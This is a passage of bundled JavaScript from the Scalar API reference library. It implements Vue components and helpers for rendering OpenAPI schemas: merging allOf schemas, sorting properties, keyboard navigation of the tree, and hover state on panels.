		* write the same state as attributes that exist only while it is hovered:
		* `data-rail-hovered` on the panel root and `data-child-rail-hovered` on the
		* panel's parent, the element the tailwind.config.css variants look through to
		* the control. Read off DOM adjacency exactly like the selectors they replace,
		* so every surface that rails a panel is covered without wiring.
		*/
		let hovered = null;
		const clearRailHover = () => {
			hovered?.panel.removeAttribute("data-rail-hovered");
			hovered?.row?.removeAttribute("data-child-rail-hovered");
			hovered = null;
		};
		const setRailHover = (event, on) => {
			clearRailHover();
			if (!on) return;
			const panel = event.currentTarget instanceof HTMLElement ? event.currentTarget.parentElement : null;
			if (!panel) return;
			const row = panel.parentElement;
			panel.setAttribute("data-rail-hovered", "");
			row?.setAttribute("data-child-rail-hovered", "");
			hovered = {
				panel,
				row
			};
		};
		/**
		* Folding the panel hides the strip under the pointer, so no pointerleave ever
		* follows the click: the marks go before the close, or the puck stays lit.
		*/
		const onStripClick = () => {
			clearRailHover();
			emit("close");
		};
		onBeforeUnmount(clearRailHover);
		return (_ctx, _cache) => {
			return openBlock(), createBlock(resolveDynamicComponent(__props.as), {
				class: "schema-rail-panel schema-rail rail-hover:border-s-c-1 relative ps-[var(--schema-gutter,16px)]",
				style: normalizeStyle({ "--schema-depth": __props.depth })
			}, {
				default: withCtx(() => [__props.closeOnRail ? (openBlock(), createElementBlock("div", {
					key: 0,
					"aria-hidden": "true",
					class: "rail-hit z-[1]",
					"data-rail-hit": "",
					onClick: withModifiers(onStripClick, ["stop"]),
					onPointerenter: _cache[0] || (_cache[0] = ($event) => setRailHover($event, true)),
					onPointerleave: _cache[1] || (_cache[1] = ($event) => setRailHover($event, false))
				}, null, 32)) : createCommentVNode("", true), renderSlot(_ctx.$slots, "default")]),
				_: 3
			}, 8, ["style"]);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/request-body-composition-index.js
/**
* Shares the selected request-body composition variants between the schema
* dropdowns and the generated request snippet for a single operation layout.
*/
var REQUEST_BODY_COMPOSITION_INDEX_SYMBOL = Symbol();
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/get-discriminator-values.js
/** Finds the payload values explicitly mapped to a referenced composition member. */
var getDiscriminatorValues = (ref, mapping) => {
	if (!ref || !mapping) return [];
	return Object.entries(mapping).filter(([, target]) => target === ref || `#/components/schemas/${target}` === ref).map(([value]) => value);
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/get-schema-type.js
/**
* Formats an array type string with proper wrapping for union types.
*/
var formatArrayType = (itemType) => {
	if (!itemType) return "array";
	return `array ${itemType.includes(" | ") ? `(${itemType})` : itemType}[]`;
};
/**
* Handles array type processing for both single array types and union types containing array.
*/
var processArrayType = (value, isUnionType = false) => {
	if (!value.items) return "array";
	const baseType = formatArrayType(getSchemaType(resolve.schema(value.items)));
	if (isUnionType) return baseType;
	return value.nullable ? `${baseType} | null` : baseType;
};
/**
* Computes the structural type for a schema.
* This helper always returns type information, never schema titles or ref names.
*
* Priority order:
* 1. const values
* 2. Array types (with special handling for items)
* 3. type with contentEncoding
* 4. raw type
*/
var getSchemaType = (valueOrRef) => {
	if (!valueOrRef) return "";
	const value = resolve.schema(valueOrRef);
	if (value.const !== void 0) return "const";
	if ("type" in value && Array.isArray(value.type)) {
		if (value.type.includes("array") && value.items) {
			const arrayType = processArrayType(value, true);
			const otherTypes = value.type.filter((t) => t !== "array");
			return otherTypes.length > 0 ? `${arrayType} | ${otherTypes.join(" | ")}` : arrayType;
		}
		return value.type.join(" | ");
	}
	if (isArraySchema(value)) return processArrayType(value, false);
	if ("type" in value && value.type && value.contentEncoding) return `${value.type} • ${value.contentEncoding}`;
	return "type" in value ? value.type : "";
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/merge-all-of-schemas.js
/**
* Schema keywords whose value should reflect the *last* occurrence when merging
* `allOf` members. Most keywords keep the first occurrence, but for human-facing
* annotations a later subschema is expected to override an earlier one — matching
* OpenAPI/JSON Schema tooling like Swagger UI.
*/
var LAST_WINS_KEYS = /* @__PURE__ */ new Set(["description", "title"]);
var ENUM_ANNOTATIONS = [
	"x-enum-varnames",
	"x-enumNames",
	"x-enum-descriptions",
	"x-enumDescriptions"
];
/** Keep positional annotations attached to their values when intersecting enum constraints. */
var mergeEnums = (existing, incoming, override = false) => {
	const values = existing.enum === void 0 ? incoming.enum?.slice() : incoming.enum === void 0 ? existing.enum.slice() : existing.enum.filter((value) => incoming.enum?.some((candidate) => isObjectEqual(value, candidate)));
	if (values === void 0) return {};
	const merged = { enum: values };
	for (const key of ENUM_ANNOTATIONS) {
		const source = incoming[key] !== void 0 && (override || existing[key] === void 0) ? incoming : existing;
		const annotation = source[key];
		const sourceValues = source.enum;
		if (Array.isArray(annotation)) merged[key] = sourceValues === void 0 ? annotation : values.map((value) => annotation[sourceValues.findIndex((candidate) => isObjectEqual(value, candidate))] ?? "");
		else if (annotation !== void 0 && (key === "x-enum-descriptions" || key === "x-enumDescriptions")) merged[key] = annotation;
	}
	return merged;
};
/**
* Merges multiple OpenAPI schema objects into a single schema object.
* Handles nested allOf compositions and merges properties recursively.
*
* @param schemas - Array of OpenAPI schema objects to merge
* @param rootSchema - Optional root schema to merge with the result
* @param seenRefs - `$ref` strings already being merged higher in the call stack
* @returns Merged schema object
*/
var mergeAllOfSchemas = (schemas, rootSchema, seenRefs = /* @__PURE__ */ new Set()) => {
	if (!schemas?.allOf?.length || !Array.isArray(schemas.allOf)) return rootSchema || {};
	const result = {};
	const { allOf: _, ...baseSchema } = schemas;
	for (const _schema of schemas.allOf) {
		if (!_schema || typeof _schema !== "object") continue;
		const schema = resolve.schema(_schema);
		if (schema.allOf) {
			mergeSchemaIntoResult(result, mergeAllOfSchemas(schema, void 0, seenRefs), false, seenRefs);
			continue;
		}
		mergeSchemaIntoResult(result, schema, false, seenRefs);
	}
	if (Object.keys(baseSchema).length > 0) mergeSchemaIntoResult(result, baseSchema, true, seenRefs);
	if (rootSchema && typeof rootSchema === "object") if (rootSchema.allOf) mergeSchemaIntoResult(result, mergeAllOfSchemas(rootSchema, void 0, seenRefs), true, seenRefs);
	else mergeSchemaIntoResult(result, rootSchema, true, seenRefs);
	const declaresOwnDiscriminator = "discriminator" in baseSchema || Boolean(rootSchema && typeof rootSchema === "object" && "discriminator" in rootSchema);
	if ("discriminator" in result && !declaresOwnDiscriminator) delete result.discriminator;
	return result;
};
/**
* Efficiently merges a source schema into a target result object.
* Handles all schema merging logic in a single optimized function.
*
* @param result - The target schema object to merge into
* @param schema - The source schema object to merge from
* @param override - Whether to override existing properties (default: false)
*/
var mergeSchemaIntoResult = (result, schema, override = false, seenRefs = /* @__PURE__ */ new Set()) => {
	const schemaKeys = objectKeys(schema);
	if (schemaKeys.length === 0) return;
	const mergedEnums = mergeEnums(result, schema, override);
	for (const key of schemaKeys) {
		const propertyName = key;
		const value = getResolvedRef(schema[key]);
		if (value === void 0) continue;
		if (propertyName === "required") {
			if (Array.isArray(value) && value.length > 0) if (result.required?.length) result.required = [.../* @__PURE__ */ new Set([...result.required, ...value])];
			else result.required = value.slice();
		} else if (propertyName === "properties") {
			if (value && typeof value === "object") {
				if (!result.properties) result.properties = {};
				mergePropertiesIntoResult(result.properties, value, seenRefs);
			}
		} else if (propertyName === "items") {
			const items = resolve.schema(value);
			if (items) {
				if (isArraySchema(schema)) {
					if (!result.items) result.items = {};
					if (items.allOf) {
						const mergedItems = mergeAllOfSchemas(items, void 0, seenRefs);
						Object.assign(result.items, mergedItems);
					} else mergeItemsIntoResult(getResolvedRef(result.items), items, seenRefs);
				} else if (items.allOf) {
					const mergedItems = mergeAllOfSchemas(items, void 0, seenRefs);
					if ("properties" in mergedItems) {
						if (!("properties" in result)) result.properties = {};
						"properties" in result && mergePropertiesIntoResult(result.properties, mergedItems.properties, seenRefs);
					}
				} else if (!("items" in result)) result.items = items;
			}
		} else if (key === "enum") continue;
		else if (key === "oneOf" || key === "anyOf") {
			if (Array.isArray(value) && value.length > 0 && (override || result[key] === void 0)) result[key] = value;
		} else if (key === "allOf") continue;
		else if (override || LAST_WINS_KEYS.has(propertyName) || result[key] === void 0) result[key] = value;
	}
	Object.assign(result, mergedEnums);
};
/**
* Efficiently merges properties into a result object without creating new objects.
*/
var mergePropertiesIntoResult = (result, properties, seenRefs = /* @__PURE__ */ new Set()) => {
	const propertyKeys = Object.keys(properties ?? {});
	if (!properties || !result || propertyKeys.length === 0) return;
	for (const key of propertyKeys) {
		const schema = resolve.schema(properties[key]);
		if (!schema) {
			delete result[key];
			continue;
		}
		if (typeof schema !== "object") {
			result[key] = schema;
			continue;
		}
		if (!result[key]) {
			const rawProperty = properties[key];
			const newSchemaRef = rawProperty?.$ref;
			if (rawProperty && typeof newSchemaRef === "string" && seenRefs.has(newSchemaRef)) {
				result[key] = rawProperty;
				continue;
			}
			const nextNewSeenRefs = typeof newSchemaRef === "string" ? new Set(seenRefs).add(newSchemaRef) : seenRefs;
			if (schema.allOf) result[key] = mergeAllOfSchemas(schema, void 0, nextNewSeenRefs);
			else if (isArraySchema(schema) && resolve.schema(schema.items)?.allOf) result[key] = {
				...schema,
				items: mergeAllOfSchemas(resolve.schema(schema.items), void 0, seenRefs)
			};
			else if (properties[key]) result[key] = properties[key];
			continue;
		}
		const existing = resolve.schema(result[key]);
		const schemaRef = schema.$ref;
		if (typeof schemaRef === "string" && seenRefs.has(schemaRef)) {
			result[key] = existing;
			continue;
		}
		const nextSeenRefs = typeof schemaRef === "string" ? new Set(seenRefs).add(schemaRef) : seenRefs;
		if (schema.allOf) result[key] = mergeAllOfSchemas({ allOf: [existing, schema] }, void 0, nextSeenRefs);
		else if (isArraySchema(schema) && isArraySchema(existing) && schema.items) {
			const existingItems = resolve.schema(existing.items);
			result[key] = {
				...existing,
				type: "array",
				items: existingItems ? mergeItems(existingItems, resolve.schema(schema.items), nextSeenRefs) : resolve.schema(schema.items)
			};
		} else if ("properties" in existing && "properties" in schema) {
			const merged = {
				...existing,
				...schema
			};
			merged.properties = { ...existing.properties };
			mergePropertiesIntoResult(merged.properties, schema.properties, nextSeenRefs);
			result[key] = merged;
		} else result[key] = {
			...schema,
			...existing,
			...mergeEnums(existing, schema)
		};
	}
};
/**
* Efficiently merges array items into a result object.
*/
var mergeItemsIntoResult = (result, items, seenRefs = /* @__PURE__ */ new Set()) => {
	if (items.allOf || result.allOf) {
		const allOfSchemas = [];
		if (result.allOf) for (const schema of result.allOf) allOfSchemas.push(resolve.schema(schema));
		else allOfSchemas.push(result);
		if (items.allOf) for (const schema of items.allOf) allOfSchemas.push(resolve.schema(schema));
		else allOfSchemas.push(items);
		const merged = mergeAllOfSchemas({ allOf: allOfSchemas }, void 0, seenRefs);
		Object.assign(result, merged);
		return;
	}
	Object.assign(result, items);
	if ("properties" in result && "properties" in items) mergePropertiesIntoResult(result.properties, items.properties, seenRefs);
};
/**
* Helper function for merging items that returns a new object.
*/
var mergeItems = (existing, incoming, seenRefs = /* @__PURE__ */ new Set()) => {
	const incomingRef = incoming.$ref;
	if (typeof incomingRef === "string") {
		if (seenRefs.has(incomingRef)) return existing;
		return mergeItemsInner(existing, incoming, new Set(seenRefs).add(incomingRef));
	}
	return mergeItemsInner(existing, incoming, seenRefs);
};
var mergeItemsInner = (existing, incoming, seenRefs = /* @__PURE__ */ new Set()) => {
	if (existing.allOf || incoming.allOf) {
		const allOfSchemas = [];
		if (existing.allOf) for (const schema of existing.allOf) allOfSchemas.push(resolve.schema(schema));
		else allOfSchemas.push(existing);
		if (incoming.allOf) for (const schema of incoming.allOf) allOfSchemas.push(resolve.schema(schema));
		else allOfSchemas.push(incoming);
		return mergeAllOfSchemas({ allOf: allOfSchemas }, void 0, seenRefs);
	}
	if ("properties" in existing && "properties" in incoming) {
		const merged = {
			...existing,
			...incoming,
			properties: { ...existing.properties }
		};
		mergePropertiesIntoResult(merged.properties, incoming.properties, seenRefs);
		return merged;
	}
	return {
		...existing,
		...incoming
	};
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/partition-all-of-compositions.js
var CHOICE_KEYWORDS = ["oneOf", "anyOf"];
/**
* Flattens a member's own (non-composition) properties and every `oneOf`/`anyOf`
* group it declares — recursing into nested `allOf` — into a flat, ordered list,
* preserving source order so choice groups stay where they were authored.
*
* Pure-constraint keywords (`not`, `if/then/else`) are dropped: they carry no
* visual variant and Scalar would otherwise render `not` as a bogus picker. The
* rule still lives in the schema (validation) and in field descriptions.
*/
var collectMembers = (schema, out, seenRefs) => {
	const { allOf, oneOf, anyOf, not: _not, if: _if, then: _then, else: _else, ...rest } = schema;
	if (Object.keys(rest).length > 0) out.push({
		kind: "object",
		schema: rest
	});
	for (const keyword of CHOICE_KEYWORDS) {
		const value = keyword === "oneOf" ? oneOf : anyOf;
		const selectsAncestor = Array.isArray(value) && value.some((branch) => {
			const ref = branch && typeof branch === "object" && "$ref" in branch ? branch.$ref : void 0;
			return typeof ref === "string" && seenRefs.has(ref);
		});
		if (Array.isArray(value) && value.length > 0) out.push({
			kind: "choice",
			composition: keyword,
			value: { [keyword]: value },
			inheritedSelection: selectsAncestor
		});
	}
	if (Array.isArray(allOf)) {
		for (const rawMember of allOf) if (rawMember && typeof rawMember === "object") {
			const resolved = resolve.schema(rawMember);
			const ref = resolved.$ref;
			if (typeof ref === "string") {
				if (seenRefs.has(ref)) continue;
				collectMembers(resolved, out, new Set(seenRefs).add(ref));
			} else collectMembers(resolved, out, seenRefs);
		}
	}
};
/**
* Splits an `allOf` schema into an ordered list of segments so the renderer can
* show each `oneOf`/`anyOf` group as its own picker **in the position it was
* declared**, with the surrounding plain fields around it.
*
* `mergeAllOfSchemas` alone keeps only the FIRST `oneOf`/`anyOf` (dropping the
* 2nd+ groups of an object with several independent mutually-exclusive
* selections) and, being a merge, also loses the ordering between fields and
* choices. Walking the members in order fixes both: runs of consecutive object
* members are merged into one object segment, and each choice member becomes its
* own picker segment in place.
*/
var partitionAllOfCompositions = (schema) => {
	if (!schema) return { segments: [] };
	const { allOf, oneOf: _oneOf, anyOf: _anyOf, not: _not, if: _if, then: _then, else: _else, ...rest } = schema;
	if (!Array.isArray(allOf)) return { segments: [{
		kind: "object",
		schema
	}] };
	const members = [];
	if (Object.keys(rest).length > 0) members.push({
		kind: "object",
		schema: rest
	});
	const schemaRef = "$ref" in schema ? schema.$ref : void 0;
	const seenRefs = new Set(typeof schemaRef === "string" ? [schemaRef] : []);
	for (const rawMember of allOf) if (rawMember && typeof rawMember === "object") {
		const resolved = resolve.schema(rawMember);
		const ref = resolved.$ref;
		collectMembers(resolved, members, typeof ref === "string" ? new Set(seenRefs).add(ref) : seenRefs);
	}
	const segments = [];
	let objectRun = [];
	let choiceIndex = 0;
	const flushObjectRun = () => {
		if (objectRun.length === 0) return;
		const merged = objectRun.length === 1 ? objectRun[0] : mergeAllOfSchemas({ allOf: objectRun });
		segments.push({
			kind: "object",
			schema: merged
		});
		objectRun = [];
	};
	for (const member of members) if (member.kind === "object") objectRun.push(member.schema);
	else if (member.inheritedSelection) choiceIndex++;
	else {
		flushObjectRun();
		segments.push({
			kind: "choice",
			composition: member.composition,
			value: member.value,
			choiceIndex: choiceIndex++
		});
	}
	flushObjectRun();
	return { segments };
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/schema-name.js
/**
* Extract schema name from various schema formats
*
* Handles $ref, title, name, type, and schema dictionary lookup
*/
var getModelNameFromSchema = (schemaOrRef) => {
	if (!schemaOrRef) return null;
	const schema = resolve.schema(schemaOrRef);
	const schemaKey = "$ref" in schemaOrRef ? getSchemaRefName(schemaOrRef.$ref) : null;
	if (schema.title) return {
		schemaKey,
		label: schema.title
	};
	if (schema.name) return {
		schemaKey,
		label: schema.name
	};
	if ("$ref" in schemaOrRef) {
		const label = getRefName(schemaOrRef.$ref);
		if (label) return {
			schemaKey,
			label
		};
	}
	return null;
};
/**
* Model name for a schema, resolving array branches too: an inline
* `{ type: 'array', items: { $ref: Model } }` becomes `Model[]` instead of the
* structural `array object[]`. Returns `null` when no model name applies (for
* example an array of primitives), so callers can fall back to `getSchemaType`.
*/
var getModelNameWithArray = (schemaOrRef) => {
	const direct = getModelNameFromSchema(schemaOrRef);
	if (direct) return direct;
	const schema = resolve.schema(schemaOrRef);
	if (isArraySchema(schema) && schema.items) {
		const itemName = getModelNameFromSchema(schema.items);
		if (itemName) return {
			schemaKey: itemName.schemaKey,
			label: `${itemName.label}[]`
		};
	}
	return null;
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaGlyphPuck.vue.js
var SchemaGlyphPuck_default = /* @__PURE__ */ defineComponent({
	__name: "SchemaGlyphPuck",
	props: {
		open: { type: Boolean },
		floating: {
			type: Boolean,
			default: true
		},
		anchor: { default: "middle" }
	},
	setup(__props) {
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("span", {
				"aria-hidden": "true",
				class: normalizeClass(["schema-glyph tree-control-hover:bg-b-1 tree-control-hover:text-c-1 tree-control-hover:border-(--scalar-border-color) print:bg-transparent [&_svg]:size-[var(--schema-glyph-icon,16px)]", __props.floating ? ["absolute start-[calc(0px_-_var(--schema-glyph-half,9px)_-_var(--schema-gutter,16px))] -translate-y-1/2", __props.anchor === "line" ? "top-[0.5lh]" : "top-1/2"] : void 0])
			}, [renderSlot(_ctx.$slots, "default", {}, () => [__props.open ? (openBlock(), createBlock(unref(ScalarIconMinus_default), {
				key: 0,
				weight: "light"
			})) : (openBlock(), createBlock(unref(ScalarIconPlus_default), {
				key: 1,
				weight: "light"
			}))])], 2);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/is-empty-schema-object.js
/**
* Determines if the given schema is an empty object schema.
* An empty object schema is defined as a schema with type 'object'
* and no defined properties, no additionalProperties (or set to false), and no patternProperties.
*/
var isEmptySchemaObject = (schema) => {
	if (!isTypeObject(schema)) return false;
	const hasNoProperties = Object.keys(schema.properties ?? {}).length === 0;
	const hasNoAdditionalProperties = schema.additionalProperties === void 0 || schema.additionalProperties === false;
	const hasNoPatternProperties = Object.keys(schema.patternProperties ?? {}).length === 0;
	return hasNoProperties && hasNoAdditionalProperties && hasNoPatternProperties;
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/schema-keyboard-nav.js
/**
* Arrow-key navigation over the schema tree's disclosure toggles, behind
* `schemaKeyboardNav`. One delegated keydown per tree root, only for a
* `[data-schema-toggle]` target with no modifier held. The bindings follow the
* APG tree pattern, but nothing announces them, so Tab order must stand alone.
*/
/**
* All toggles under the root that are visible right now. `offsetParent` alone
* is not enough: a panel kept as `hidden="until-found"` retains its descendants'
* layout boxes, so their toggles pass that test while `focus()` does nothing.
*/
var visibleToggles = (root) => [...root.querySelectorAll("[data-schema-toggle]")].filter((toggle) => toggle.offsetParent !== null && !toggle.closest("[hidden]"));
/** The toggle of the row that owns the panel this toggle's row sits inside. */
var parentToggle = (toggle) => toggle.closest(".property-children")?.closest(".property--tree")?.querySelector(":scope > [data-schema-toggle]") ?? null;
/** The first toggle inside this row's own panel, when one is open. */
var firstChildToggle = (toggle) => toggle.closest(".property--tree")?.querySelector(":scope > .property-children [data-schema-toggle]") ?? null;
/**
* Move focus between tree toggles in response to one keydown.
*
* Bind this as a keydown listener on any element that owns tree rows — the
* schema tree itself, or the response headers group that sits beside one. The
* listener is delegated, so the element it is bound to defines the set of rows
* it navigates: `event.currentTarget` is the root, and only the toggles under
* that root are reachable.
*
* It acts only when the event target is a `[data-schema-toggle]` element and no
* modifier key is held, so typing and browser shortcuts pass through untouched.
* When it does handle a key it calls `preventDefault`, which doubles as the
* handoff between nested roots: an inner root marks the event, and any outer
* delegate the event bubbles to leaves focus where the inner one put it.
*/
var handleTreeKeydown = (event) => {
	const target = event.target;
	if (event.defaultPrevented || !(target instanceof HTMLElement) || !target.hasAttribute("data-schema-toggle") || event.altKey || event.ctrlKey || event.metaKey || event.shiftKey) return;
	const root = event.currentTarget instanceof HTMLElement ? event.currentTarget : null;
	if (!root) return;
	const toggles = visibleToggles(root);
	const index = toggles.indexOf(target);
	if (index === -1) return;
	const isExpanded = target.getAttribute("aria-expanded") === "true";
	switch (event.key) {
		case "ArrowDown":
			toggles[index + 1]?.focus();
			break;
		case "ArrowUp":
			toggles[index - 1]?.focus();
			break;
		case "ArrowRight":
			if (!isExpanded) target.click();
			else firstChildToggle(target)?.focus();
			break;
		case "ArrowLeft":
			if (isExpanded) target.click();
			else parentToggle(target)?.focus();
			break;
		case "Home":
			toggles[0]?.focus();
			break;
		case "End":
			toggles[toggles.length - 1]?.focus();
			break;
		default: return;
	}
	event.preventDefault();
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/sort-property-names.js
/** Take a list of property names and reduce it back into an object */
var reduceNamesToObject = (names, properties) => names.reduce((acc, name) => {
	const prop = properties?.[name];
	if (prop) acc[name] = prop;
	return acc;
}, {});
/**
* One collator for every sort, rather than a fresh locale lookup per comparison.
* `String.localeCompare` builds its collator on each call, which dominates the
* comparator on schemas with many properties; `Intl.Collator` is the same
* ordering with the setup hoisted out of the loop.
*/
var collator = new Intl.Collator(void 0);
var sortCache = /* @__PURE__ */ new WeakMap();
/** The one array every "nothing to sort" answer returns, frozen like the sorted ones. */
var EMPTY_NAMES = Object.freeze([]);
/**
* Sort property names in an object schema.
*
* The returned array is shared with later calls for the same schema and options,
* so it is frozen: an in-place `sort` / `reverse` / `splice` by one caller would
* otherwise silently reorder every other consumer of the same schema. Callers
* that need a mutable list copy it first (`slice`).
*/
var sortPropertyNames = (schema, discriminator, { hideReadOnly = false, hideWriteOnly = false, orderSchemaPropertiesBy = "alpha", orderRequiredPropertiesFirst = true } = {}) => {
	if (!isTypeObject(schema) || !schema.properties) return EMPTY_NAMES;
	const properties = schema.properties;
	const required = schema.required;
	const discriminatorName = discriminator?.propertyName;
	const cacheKey = [
		discriminatorName === void 0 ? "" : `!${discriminatorName}`,
		hideReadOnly,
		hideWriteOnly,
		orderSchemaPropertiesBy,
		orderRequiredPropertiesFirst
	].join("|");
	const bucket = sortCache.get(properties);
	const cached = bucket?.get(cacheKey);
	if (cached && cached.required === required) return cached.names;
	const requiredPropertiesSet = new Set(required || []);
	const shouldFilter = hideReadOnly || hideWriteOnly;
	const records = [];
	for (const name of Object.keys(properties)) {
		const propertySchema = properties[name];
		if (shouldFilter) {
			const resolved = resolve.schema(propertySchema);
			if (hideReadOnly && resolved?.readOnly === true) continue;
			if (hideWriteOnly && resolved?.writeOnly === true) continue;
		}
		records.push({
			name,
			order: propertySchema && typeof propertySchema === "object" && "x-order" in propertySchema ? propertySchema["x-order"] : void 0,
			required: requiredPropertiesSet.has(name),
			discriminator: name === discriminatorName
		});
	}
	records.sort((a, b) => {
		if (a.discriminator && !b.discriminator) return -1;
		if (!a.discriminator && b.discriminator) return 1;
		if (a.order !== void 0 && b.order !== void 0) return Number(a.order) - Number(b.order);
		if (a.order !== void 0 && b.order === void 0) return -1;
		if (a.order === void 0 && b.order !== void 0) return 1;
		if (orderRequiredPropertiesFirst) {
			if (a.required && !b.required) return -1;
			if (!a.required && b.required) return 1;
		}
		if (orderSchemaPropertiesBy === "alpha") return collator.compare(a.name, b.name);
		return 0;
	});
	const names = Object.freeze(records.map((record) => record.name));
	if (typeof properties === "object" && properties !== null) if (bucket) bucket.set(cacheKey, {
		required,
		names
	});
	else sortCache.set(properties, /* @__PURE__ */ new Map([[cacheKey, {
		required,
		names
	}]]));
	return names;
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaObjectProperties.vue.js
var SchemaObjectProperties_default = /* @__PURE__ */ defineComponent({
	__name: "SchemaObjectProperties",
	props: {
		schema: {},
		discriminator: {},
		compact: { type: Boolean },
		hideHeading: { type: Boolean },
		level: {},
		depth: {},
		hideModelNames: { type: Boolean },
		breadcrumb: {},
		eventBus: {},
		options: {},
		schemaContext: {},
		compositionPath: {}
	},
	setup(__props) {
		/**
		* Sorts properties by required status first, then alphabetically.
		* Required properties appear first, followed by optional properties.
		*/
		const sortedProperties = computed(() => sortPropertyNames(__props.schema, __props.discriminator, __props.options));
		/**
		* Get the display name for additional properties.
		*
		* Checks x-additionalPropertiesName extension first, then falls back to the
		* propertyNames schema title if available.
		*/
		const getAdditionalPropertiesName = (_additionalProperties, _propertyNames) => {
			const additionalProperties = typeof _additionalProperties === "boolean" ? _additionalProperties : resolve.schema(_additionalProperties);
			if (typeof additionalProperties === "object" && typeof additionalProperties["x-additionalPropertiesName"] === "string" && additionalProperties["x-additionalPropertiesName"].trim().length > 0) return `${additionalProperties["x-additionalPropertiesName"].trim()}`;
			if (_propertyNames) {
				const resolved = resolve.schema(_propertyNames);
				if (resolved?.title) return resolved.title;
			}
			return "propertyName";
		};
		/**
		* Extract enum values from the propertyNames schema.
		*
		* JSON Schema's propertyNames keyword constrains which keys are valid
		* in an object with additionalProperties. When it contains an enum,
		* these are the allowed key names.
		*/
		const getPropertyNamesEnum = (_propertyNames) => {
			if (!_propertyNames) return;
			const resolved = resolve.schema(_propertyNames);
			if (resolved && "enum" in resolved && Array.isArray(resolved.enum) && resolved.enum.length > 0) return resolved.enum;
		};
		/** Enum values for the property keys, derived from propertyNames if present. */
		const additionalPropertiesEnum = computed(() => {
			if (!isTypeObject(__props.schema) || !__props.schema.additionalProperties) return;
			return getPropertyNamesEnum(__props.schema.propertyNames);
		});
		/**
		* The resolved propertyNames schema for the property keys.
		*
		* Surfaces key constraints such as `format` (for example `uuid`) so they are
		* not lost when rendering a map of additional properties.
		*/
		const additionalPropertiesKeySchema = computed(() => {
			if (!isTypeObject(__props.schema) || !__props.schema.additionalProperties) return;
			return __props.schema.propertyNames ? resolve.schema(__props.schema.propertyNames) : void 0;
		});
		/**
		* Keep sibling property descriptions separate from the referenced schema.
		*
		* This allows us to render both:
		* - the property-specific description written next to the $ref, and
		* - the referenced schema's own description (for example discriminator parent docs)
		*/
		const getPropertySchema = (property) => {
			if (!property) return;
			return resolve.schema(property);
		};
		const getPropertyDescription = (property) => {
			if (!property) return;
			return typeof property.description === "string" ? property.description : void 0;
		};
		const rows = computed(() => {
			if (!isTypeObject(__props.schema) || !__props.schema.properties) return [];
			const { properties } = __props.schema;
			const requiredSet = new Set(__props.schema.required ?? []);
			return sortedProperties.value.map((name) => {
				const property = properties[name];
				return {
					name,
					cycleKey: getCycleKey(property),
					description: getPropertyDescription(property),
					required: requiredSet.has(name),
					schema: getPropertySchema(property)
				};
			});
		});
		/**
		* Get the value for additional properties.
		*
		* When additionalProperties is true or an empty object, it should render as { type: 'anything' }.
		* $ref values are resolved before the type check so the referenced schema is rendered correctly.
		*/
		const getAdditionalPropertiesValue = (additionalProperties) => {
			const resolved = typeof additionalProperties === "boolean" ? additionalProperties : resolve.schema(additionalProperties);
			if (resolved === true || typeof resolved === "object" && Object.keys(resolved).length === 0 || typeof resolved !== "object" || !("type" in resolved)) return {
				type: "anything",
				...typeof resolved === "object" ? resolved : {}
			};
			return resolved;
		};
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock(Fragment, null, [
				unref(isTypeObject)(__props.schema) && __props.schema.properties ? (openBlock(true), createElementBlock(Fragment, { key: 0 }, renderList(rows.value, (row) => {
					return openBlock(), createBlock(SchemaProperty_default, {
						key: row.name,
						breadcrumb: __props.breadcrumb,
						compact: __props.compact,
						compositionPath: __props.compositionPath,
						compositionPathSegment: row.name,
						cycleKey: row.cycleKey,
						description: row.description,
						discriminator: __props.discriminator,
						eventBus: __props.eventBus,
						hideHeading: __props.hideHeading,
						hideModelNames: __props.hideModelNames,
						depth: __props.depth,
						level: __props.level,
						name: row.name,
						options: __props.options,
						required: row.required,
						schema: row.schema,
						schemaContext: __props.schemaContext
					}, null, 8, [
						"breadcrumb",
						"compact",
						"compositionPath",
						"compositionPathSegment",
						"cycleKey",
						"description",
						"discriminator",
						"eventBus",
						"hideHeading",
						"hideModelNames",
						"depth",
						"level",
						"name",
						"options",
						"required",
						"schema",
						"schemaContext"
					]);
				}), 128)) : createCommentVNode("", true),
				unref(isTypeObject)(__props.schema) && __props.schema.patternProperties ? (openBlock(true), createElementBlock(Fragment, { key: 1 }, renderList(Object.entries(__props.schema.patternProperties), ([key, property]) => {
					return openBlock(), createBlock(SchemaProperty_default, {
						key,
						breadcrumb: __props.breadcrumb,
						compact: __props.compact,
						compositionPath: __props.compositionPath,
						compositionPathSegment: key,
						cycleKey: unref(getCycleKey)(property),
						description: getPropertyDescription(property),
						discriminator: __props.discriminator,
						eventBus: __props.eventBus,
						hideHeading: __props.hideHeading,
						hideModelNames: __props.hideModelNames,
						depth: __props.depth,
						level: __props.level,
						name: key,
						options: __props.options,
						schema: getPropertySchema(property),
						schemaContext: __props.schemaContext
					}, null, 8, [
						"breadcrumb",
						"compact",
						"compositionPath",
						"compositionPathSegment",
						"cycleKey",
						"description",
						"discriminator",
						"eventBus",
						"hideHeading",
						"hideModelNames",
						"depth",
						"level",
						"name",
						"options",
						"schema",
						"schemaContext"
					]);
				}), 128)) : createCommentVNode("", true),
				unref(isTypeObject)(__props.schema) && __props.schema.additionalProperties ? (openBlock(), createBlock(SchemaProperty_default, {
					key: 2,
					breadcrumb: __props.breadcrumb,
					compact: __props.compact,
					compositionPath: __props.compositionPath,
					compositionPathSegment: getAdditionalPropertiesName(__props.schema.additionalProperties, __props.schema.propertyNames),
					cycleKey: unref(getCycleKey)(__props.schema.additionalProperties),
					discriminator: __props.discriminator,
					eventBus: __props.eventBus,
					hideHeading: __props.hideHeading,
					hideModelNames: __props.hideModelNames,
					depth: __props.depth,
					level: __props.level,
